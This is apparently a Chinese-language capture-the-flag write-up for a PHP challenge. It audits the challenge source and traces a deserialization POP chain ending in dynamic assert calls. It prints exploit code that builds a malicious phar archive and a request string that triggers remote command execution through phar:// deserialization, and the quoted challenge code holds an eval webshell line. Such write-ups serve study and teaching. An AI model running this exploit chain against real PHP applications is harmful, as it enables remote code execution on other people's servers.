##### 前期分析

类似一个文件上传加文件包含，先尝试在read.php中访问本地read.php、index.php、class.php(read.php源码中)

```
<br>
<textarea class="file_content" type="text" value=<?php echo "<br>".$contents;?>
```

先做代码审计，因为标签报错，所以无法直接解析php代码，考虑到可以反序列化pop链找到可利用的函数

```
<?php
class aa{
    public $name;

    public function __construct(){
        $this->name='aa';
    }

    public function __destruct(){
        $this->name=strtolower($this->name);
    }
}

class ff{
    private $content;
    public $func;

    public function __construct(){
        $this->content="\<?php @eval(\$_POST[1]);?>";
    }

    public function __get($key){
        $this->$key->{$this->func}($_POST['cmd']);
    }
}

class zz{
    public $filename;
    public $content='surprise';

    public function __construct($filename){
        $this->filename=$filename;
    }

    public function filter(){
        if(preg_match('/^\/|php:|data|zip|\.\.\//i',$this->filename)){
            die('这不合理');
        }
    }

    public function write($var){
        $filename=$this->filename;
        $lt=$this->filename->$var;
        //此功能废弃，不想写了
    }

    public function getFile(){
        $this->filter();
        $contents=file_get_contents($this->filename);
        if(!empty($contents)){
            return $contents;
        }else{
            die("404 not found");
        }
    }

    public function __toString(){
        $this->{$_POST['method']}($_POST['var']);
        return $this->content;
    }
}

class xx{
    public $name;
    public $arg;

    public function __construct(){
        $this->name='eval';
        $this->arg='phpinfo();';
    }

    public function __call($name,$arg){
        $name($arg[0]);
    }
}
```

##### pop链分析：

```
aa __destruct()->
zz __toString() ( method=write&var=content )->
zz write ( filename=new ff() ) ->
ff __get($key)  ( func=assert&cmd=phpinfo(); )->
xx __call($name,$arg)
```

##### 有两个小知识点：

```
content能被识别为属性的原因

<?php
class aa{
    public $name;
    public function __construct(){
        $this->name='111';
    }
}
$aa=new aa();
$b='name';
echo '3'.$aa->{'name'}.'</br>';
echo '4'.$aa->$b.'</br>';
var_dump($b);
?>
php中可以用这样的方式访问对象的属性（目前在php文档中查不到，要是有人知道麻烦踢踢）
```



```
选择assert而不是eval的原因，eval并不支持动态执行，所以用system也可以，但低版本php不优先考虑

<?php
    $a='assert';
    $b='eval';
    $c='phpinfo();';
    $a($c);
    $b($c);
?>
```

[PHP: 可变函数 - Manual](https://www.php.net/manual/zh/functions.variable-functions.php)

[动态调用函数时的命令执行对于eval()和assert()的执行问题_cannot call assert() with string argument dynamica-CSDN博客](https://blog.csdn.net/weixin_43669045/article/details/107093451)



最后的payload，因为本地运行php版本不一样，魔法函数可以尽量减少掉

```
<?php
class aa{
    public $name;
    public function __construct(){
        $this->name=new zz();
    }
}

class ff{
    private $content;
    public $func="assert";
    public function __construct(){
        $this->content=new xx();
    }
}

class zz{
    public $filename;
    public $content='surprise';

    public function __construct(){
        $this->filename=new ff();
    }
}

class xx{
    public $name;
    public $arg;

    public function __construct(){
        $this->name='eval';
        $this->arg='phpinfo();';
		//eval('phpinfo();');
    }
}
$a=new aa();
echo serialize($a);
unserialize($_POST[1]);

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$phar->setMetadata($a); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

```
file=phar://upload/6f086b9f4e8795037106d3c68a87cb2a.txt&method=write&var=content&cmd=phpinfo();
```

